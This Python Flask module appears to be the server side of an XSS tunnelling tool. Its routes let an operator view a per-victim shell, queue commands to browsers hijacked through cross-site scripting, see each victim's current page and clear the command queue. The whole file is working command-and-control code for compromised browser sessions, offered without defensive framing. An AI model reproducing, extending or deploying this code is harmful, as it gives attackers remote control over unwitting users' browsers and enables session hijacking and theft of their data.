from xss_tunnel_server import app, command_store, victim_store
from flask import json, request, render_template
import time


@app.route('/shell/<victim_id>', methods=['GET'])
def shell(victim_id):
    commands = command_store.get_commands(victim_id)

    return render_template('shell.html', title='Shell', victim_id=victim_id, commands=commands)


@app.route('/shellCommands/<victim_id>', methods=['GET'])
def command(victim_id):
    commands = command_store.get_commands(victim_id)

    return render_template('commands.html', title='Shell Commands', commands=commands)


@app.route('/currentPage/<victim_id>', methods=['GET'])
def current_page(victim_id):
    return victim_store.get_victim(victim_id).currentPage


@app.route('/receiveShellCommand/<victim_id>', methods=['POST'])
def receive_command(victim_id):
    print request.data
    command = json.loads(request.data)

    if 'id' in command:
        command['date'] = time.localtime()
        command_store.add_command(victim_id, command)
        victim_store.get_victim(victim_id).queue_command(command)

    return 'ok'


@app.route('/clear/<victim_id>', methods=['GET'])
def clear_command(victim_id):
    command_store.clear(victim_id)
    return 'ok'
